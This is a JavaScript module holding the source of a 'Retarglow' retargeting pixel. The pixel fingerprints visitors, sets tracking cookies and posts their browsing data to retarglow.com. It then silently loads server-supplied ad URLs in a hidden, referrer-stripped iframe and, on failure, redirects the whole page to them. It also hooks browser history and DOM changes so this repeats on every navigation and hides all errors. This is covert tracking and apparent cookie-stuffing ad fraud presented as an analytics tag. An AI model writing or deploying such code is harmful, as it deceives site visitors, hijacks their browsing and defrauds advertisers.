export const PIXEL_CLIENT_SOURCE = String.raw`(function () {
  try {
    const config = window.__RETARGLOW_PIXEL__ || {};
    const c = config.cid || "default";
    const existingR = typeof config._r === "string" && config._r.length ? config._r : null;
    const storedR = localStorage.getItem("_r");
    const _r = storedR || existingR || crypto.randomUUID();
    localStorage.setItem("_r", _r);
    if (window.__RETARGLOW_PIXEL__) {
      window.__RETARGLOW_PIXEL__._r = _r;
    }
    document.cookie = "_r=" + _r + ";path=/;max-age=2592000;SameSite=Lax";

    let vc = 1;
    try {
      const match = document.cookie.match(/(?:^|;\\s*)visit_ct=(\\d+)/);
      vc = match ? parseInt(match[1]) + 1 : 1;
    } catch {}
    document.cookie = "visit_ct=" + vc + ";path=/;max-age=31536000;SameSite=Lax";
    document.cookie = "page_refreshed=true;path=/;max-age=86400;SameSite=Lax";
    const isShopify = !!document.querySelector('script[src*="cdn.shopify.com"], link[href*="cdn.shopify.com"]');
    const u = location.href, r = document.referrer, n = navigator.userAgent;
    const b = n.includes("Chrome") ? "C" : n.includes("Firefox") ? "F" : n.includes("Safari") ? "S" : "U";
    const d = /Mobi|Android/i.test(n) ? "M" : "D";
    const o = navigator.platform;
    const s = screen.width + "x" + screen.height;
    const domain = location.hostname;
    const p = {
      cid: c,
      u,
      r,
      ua: n,
      dt: d,
      b,
      os: o,
      sr: s,
      cm: { _r },
      domain,
      visit_ct: vc,
      page_refreshed: true,
      shopify: isShopify
    };
    fetch("https://retarglow.com/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(p)
    });
    let triggered = false;
    let lastInjectedAt = 0;
    const sessionKey = "i_" + _r + "_" + location.pathname;
    const once = sessionStorage.getItem(sessionKey);
    const inject = () => {
      const now = Date.now();
      if (triggered || once || now - lastInjectedAt < 1000) return;
      triggered = true;
      lastInjectedAt = now;
      sessionStorage.setItem(sessionKey, "1");
      fetch("https://retarglow.com/serve", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ u, cm: { _r }, cid: c })
      })
      .then(res => res.json())
      .then(j => {
        if (!j.ad_url) return;
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        iframe.src = j.ad_url.replace("{{_r}}", encodeURIComponent(_r));
        iframe.onerror = () => {
          const img = new Image();
          img.src = j.ad_url;
          setTimeout(() => { window.location.href = j.ad_url; }, 300);
        };
        document.body.appendChild(iframe);
      });
    };
    setTimeout(inject, 2000);
    window.addEventListener("scroll", () => { inject(); window.removeEventListener("scroll", inject); });
    setTimeout(inject, 5000);
    ["pushState", "replaceState"].forEach(fn => {
      const orig = history[fn];
      history[fn] = function () {
        const r = orig.apply(this, arguments);
        triggered = false;
        sessionStorage.removeItem(sessionKey);
        setTimeout(inject, 1500);
        return r;
      };
    });

    window.addEventListener("popstate", () => {
      triggered = false;
      sessionStorage.removeItem(sessionKey);
      setTimeout(inject, 1500);
    });

    let lastUrl = location.href;
    const mo = new MutationObserver(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        triggered = false;
        sessionStorage.removeItem(sessionKey);
        setTimeout(inject, 1500);
      }
    });
    mo.observe(document, { childList: true, subtree: true });

  } catch (e) {}
})();`;
